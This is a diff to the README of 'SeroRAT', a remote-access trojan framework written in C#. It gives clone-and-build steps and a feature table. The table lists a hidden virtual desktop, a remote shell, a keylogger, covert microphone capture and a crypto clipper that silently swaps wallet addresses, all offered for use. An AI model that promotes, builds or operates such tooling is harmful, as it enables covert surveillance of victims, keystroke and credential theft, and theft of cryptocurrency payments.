@@ -28,6 +28,7 @@ SeroRAT is a modular C2 framework written in C# featuring a WPF server and a har
 git clone https://github.com/SeroSkiid/SeroC2
 cd SeroC2
 setup.bat          :: installs .NET SDK + VS Build Tools (run as Admin)
+build.bat
 ```
 
 Open `Sero.sln` in **Visual Studio 2026**, build (`F6`), and launch `SeroServer.exe`. Configure and build the client stub from the **Builder** tab.
@@ -45,12 +46,13 @@ Open `Sero.sln` in **Visual Studio 2026**, build (`F6`), and launch `SeroServer.
 | HVNC | ✅ | Hidden virtual desktop — isolated session, full browser support |
 | Remote Shell | ✅ | Interactive cmd/PowerShell |
 | File Manager | ✅ | Navigate, download, upload, rename, delete, hash, exec, wallpaper, 7-zip |
-| TCP Manager | ✅ | List all TCP connections per PID, force-close via SetTcpEntry |
+| TCP Manager | ✅ | List all TCP connections per PID, force-close via SetTcpEntry, block process/port via Windows Firewall |
 | Startup Manager | ✅ | List/delete Registry Run, Startup folder, Scheduled Tasks |
 | Microphone | ✅ | Real-time audio capture, waveform visualization, live listen in server, save WAV |
 | Fun | ✅ | CD-ROM, Taskbar, Screen, Mouse swap, Volume, TTS, Crazy Mouse, Screen Rotation… |
 | Keylogger | ✅ | Low-level WH_KEYBOARD_LL hook, offline disk logging (by date), file browser UI, save .txt |
 | Crypto Clipper | ✅ | Monitors clipboard for BTC/ETH/LTC/TRX/SOL/XMR/XRP/DASH/BCH/BNB, silent address swap |
+| Performance Monitor | ✅ | Real-time CPU/RAM/Network streaming (1 s), sparkline graphs, color progress bars |
 | Process Manager | ✅ | Real-time list, CPU/RAM heat-map, suspend/resume/kill, native icons |
 | Service Manager | ✅ | List, start/stop/restart/disable/delete Windows services *(requires admin)* |
 | Window Manager | ✅ | Enumerate all windows, show/hide/focus/close/kill per handle |
